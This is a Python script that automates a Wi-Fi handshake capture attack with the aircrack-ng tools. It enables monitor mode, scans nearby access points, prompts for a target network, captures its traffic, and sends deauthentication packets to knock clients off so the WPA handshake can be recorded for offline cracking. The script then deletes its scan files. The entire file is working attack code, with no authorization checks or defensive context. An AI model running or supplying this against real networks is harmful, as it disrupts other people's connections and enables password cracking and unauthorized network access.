import subprocess
import csv
import time
import os

INTERFACE = "wlan0"
MONITOR_INTERFACE = INTERFACE + "mon"
CAPTURE_FILE_PREFIX = "handshake"
CSV_FILE = "scan-01.csv"

# Enable monitor mode
print("[*] Enabling monitor mode...")
subprocess.run(["sudo", "airmon-ng", "start", INTERFACE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(3)

# Scan for APs
print("[*] Scanning for Wi-Fi networks (20s)...")
scan = subprocess.Popen([
    "sudo", "airodump-ng", MONITOR_INTERFACE,
    "--output-format", "csv",
    "-w", "scan"
], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(20)
scan.terminate()
time.sleep(2)

# Parse CSV
aps = []
if not os.path.exists(CSV_FILE):
    print("[!] Scan failed. CSV not found.")
    exit(1)

with open(CSV_FILE, "r", encoding="utf-8", errors="ignore") as f:
    reader = csv.reader(f)
    for row in reader:
        if len(row) < 14:
            continue
        if "Station MAC" in row[0]:
            break
        bssid = row[0].strip()
        channel = row[3].strip()
        power = row[8].strip()
        essid = row[13].strip()
        if bssid and essid:
            aps.append((bssid, channel, essid, power))

if not aps:
    print("[!] No access points found.")
    exit(1)

# Display APs
print(f"\n{'No.':<4} {'Power':<6} {'ESSID':<25} {'Channel':<7}")
print("-" * 50)
for i, ap in enumerate(aps):
    print(f"{i+1:<4} {ap[3]:<6} {ap[2]:<25} {ap[1]:<7}")

# Choose target
while True:
    choice = input("\nSelect target number: ")
    if choice.isdigit() and 1 <= int(choice) <= len(aps):
        choice = int(choice) - 1
        target = aps[choice]
        break
    print("[!] Invalid choice.")

print(f"\n[+] Target selected: {target[2]} ({target[0]}) on channel {target[1]}")

# Start focused capture
print("[*] Capturing handshake...")
cap_proc = subprocess.Popen([
    "sudo", "airodump-ng",
    "--bssid", target[0],
    "--channel", target[1],
    "-w", CAPTURE_FILE_PREFIX,
    MONITOR_INTERFACE
], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(5)

# Send deauth packets
print("[*] Sending deauth packets to force handshake...")
subprocess.run([
    "sudo", "aireplay-ng",
    "--deauth", "10",
    "-a", target[0],
    MONITOR_INTERFACE
])
print("[*] Waiting for handshake to be captured (30s)...")
time.sleep(30)

# Stop airodump
cap_proc.terminate()
time.sleep(2)

# Stop monitor mode
print("[*] Disabling monitor mode...")
subprocess.run(["sudo", "airmon-ng", "stop", MONITOR_INTERFACE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Check capture file
cap_path = CAPTURE_FILE_PREFIX + "-01.cap"
if os.path.exists(cap_path):
    print(f"[✓] Handshake capture complete: {cap_path}")
else:
    print("[✗] No handshake captured. Try again or increase wait time.")

# Clean up
os.remove(CSV_FILE)
for ext in ["csv", "kismet.csv", "kismet.netxml"]:
    try:
        os.remove(f"scan-01.{ext}")
    except FileNotFoundError:
        pass

